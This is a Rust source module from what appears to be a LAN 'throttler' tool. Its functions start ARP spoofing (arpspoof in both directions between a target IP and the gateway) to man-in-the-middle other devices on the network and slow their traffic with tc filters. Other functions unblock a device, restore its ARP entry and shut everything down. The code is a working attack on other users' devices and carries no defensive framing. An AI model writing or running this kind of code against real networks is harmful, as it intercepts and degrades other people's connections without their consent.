//! Per-device actions: start throttling a device, release one device, or
//! restore everything (full shutdown).

use crate::colors::{GREEN, RESET};
use crate::state::{get_mac, log_event, State};
use crate::system::{run_quiet, spin_while};
use crate::tc::{add_tc_filters, rebuild_tc_base};
use std::process::Command;
use std::sync::{Arc, Mutex};

/// Starts ARP-spoofing + throttling a device. No-ops (and logs) if arpspoof
/// fails to start, leaving the device untouched so the next scan retries it.
pub fn throttle_device(iface: &str, gateway: &str, ip: &str, state: &Arc<Mutex<State>>) {
    let c1 = Command::new("arpspoof")
        .args(["-i", iface, "-t", ip, gateway])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
    let c2 = Command::new("arpspoof")
        .args(["-i", iface, "-t", gateway, ip])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();

    let (c1, c2) = match (c1, c2) {
        (Ok(c1), Ok(c2)) => (c1, c2),
        _ => {
            log_event(
                state,
                &format!("Failed to start arpspoof for {ip}, will retry"),
            );
            return;
        }
    };

    {
        let mut st = state.lock().unwrap();
        st.arpspoof_children.insert(ip.to_string(), (c1, c2));
        st.devices.push(ip.to_string());
    }

    add_tc_filters(iface, ip);
    let mac = get_mac(state, iface, ip);
    log_event(state, &format!("Throttled {ip} ({mac})"));
}

/// Stops throttling a single device and restores its ARP entry, leaving
/// every other throttled device untouched.
pub fn unblock_device(iface: &str, ip: &str, state: &Arc<Mutex<State>>) {
    let (rate, remaining) = {
        let mut st = state.lock().unwrap();
        if let Some((mut c1, mut c2)) = st.arpspoof_children.remove(ip) {
            let _ = c1.kill();
            let _ = c1.wait();
            let _ = c2.kill();
            let _ = c2.wait();
        }
        st.devices.retain(|d| d != ip);
        (st.rate.clone(), st.devices.clone())
    };

    let iface_owned = iface.to_string();
    let ip_owned = ip.to_string();
    spin_while("Giving full speed", move || {
        // Individual u32 filters can't be reliably deleted without their kernel-assigned
        // handle, so the whole tc tree is rebuilt from the remaining throttled devices.
        rebuild_tc_base(&iface_owned, &rate);
        for d in &remaining {
            add_tc_filters(&iface_owned, d);
        }
        run_quiet("arping", &["-c", "2", "-A", "-I", &iface_owned, &ip_owned]);
    });

    log_event(state, &format!("Unblocked {ip}"));
}

/// Full shutdown: stops all ARP spoofing, tears down traffic shaping, restores
/// ARP for every affected device, disables IP forwarding, and exits.
pub fn cleanup(state: &Arc<Mutex<State>>) {
    println!("\nCleaning up, restoring normal internet for everyone...");

    let state_owned = Arc::clone(state);
    spin_while("Restoring everyone's internet", move || {
        let mut st = state_owned.lock().unwrap();

        for (_, (mut c1, mut c2)) in st.arpspoof_children.drain() {
            let _ = c1.kill();
            let _ = c1.wait();
            let _ = c2.kill();
            let _ = c2.wait();
        }

        run_quiet("pkill", &["-f", &format!("arpspoof -i {}", st.iface)]);

        run_quiet("tc", &["qdisc", "del", "dev", &st.iface, "root"]);
        run_quiet("tc", &["qdisc", "del", "dev", &st.iface, "ingress"]);

        for ip in st.devices.iter() {
            run_quiet("arping", &["-c", "2", "-A", "-I", &st.iface, ip]);
        }
        run_quiet("arping", &["-c", "2", "-A", "-I", &st.iface, &st.gateway]);

        let _ = std::fs::write("/proc/sys/net/ipv4/ip_forward", "0");
    });

    println!("{GREEN}All devices restored to normal. Forwarding disabled. Exiting.{RESET}");
    std::process::exit(0);
}
